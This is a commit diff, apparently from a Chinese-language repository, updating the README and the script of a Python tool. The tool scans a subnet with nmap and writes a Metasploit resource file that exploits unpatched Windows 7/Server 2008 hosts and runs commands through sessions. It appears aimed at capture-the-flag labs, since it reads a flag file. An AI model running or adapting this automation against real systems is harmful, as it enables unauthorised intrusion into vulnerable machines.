fd4bbf4bad8b3d4d9762ace29217bb01ff8fe1d3
留心 <3556629862@qq.com>
2021-11-27 16:04:46 +0800

    优化README

--- README.md
+++ README.md
@@ -2,18 +2,35 @@
 * 需在Linux运行此py代码，Linux需要安装nmap和msfconsole不是特殊版本是自带python3,也可在kali直接运行
 
 ## 作用
-* 这是一个通过python使用nmap和msfconsole自动渗透windows7或者windows server 2008操作系统（只能渗透未打补丁的系统）
+* 这是一个通过python使用nmap和msfconsole自动渗透windows7或者windows server 2008操作系统取C://flagvalues.txt可以替换直接想要执行的指令-c是windows指令-C是linux指令下面（只能渗透未打补丁的系统）
 * 目前仅支持Linux系统
+* 扫描的时候严格按照提示输入网段
 * 渗透进去后可以使用sessions进行批量运行命令
-* 将来可能会添加更多功能
+* 将来应该不会再更新了因为发现了更好用的msfrpc
 
-
-# 问题
 * 如使用本工具发生意外,本人不负任何责任
 * 好好学习,天天向上！
 
-#运行方法
-##方法一
-*automsf.py
-##方法二
-*python3 automsf.py
+# 运行方法
+
+## 方法一
+
+* ```shell
+  ./automsf.py
+  ```
+
+## 方法二
+
+* ```shell
+  python3 automsf.py
+  ```
+
+## 替换为windows指令
+
+```
+从
+config.write("sessions -C 'cat C://flagvalue.txt'"+"\n")
+替换成：
+config.write("sessions -c 'cmd.exe /c type C://flagvalue.txt'" + "\n")
+```
+
--- automsf1.0.py
+++ automsf1.0.py
@@ -4,9 +4,8 @@ import os
 import re
 
 print('by lx')
-a = input("请输入你的ip段例如:192.168.1.0/24:"+"\n")
-#os.system("nmap -T 5 192.168.3.0/24 >>scann.txt")
-os.system("nmap -sS -T5 {} >>scann.txt".format(a))
+Enter_ip = input("请输入你的ip段例如:192.168.1.0/24:"+"\n")
+os.system("sudo nmap -sS -T5 {} >>scann.txt".format(Enter_ip))
 print("扫描完成")
 def log_read():
     with open("scann.txt", mode="r") as f:
@@ -36,7 +35,7 @@ def config_write_file(result):
         config.write('set RHOSTS {}'.format(Define_ip))
     config.write("\n")
     config.write("exploit"+"\n")
-    config.write("sessions -C cat C://flagvalue.txt"+"\n")
+    config.write("sessions -C 'cat C://flagvalue.txt'"+"\n")
     config.close()
 
 
@@ -44,7 +43,6 @@ def main():
     result = log_read()
     ip_write_file(result)
     config_write_file(result)
-
     os.system("chmod 777 cs.rc")
     print("正在调用msf开始攻击")
     mg = os.system('msfconsole -r cs.rc')
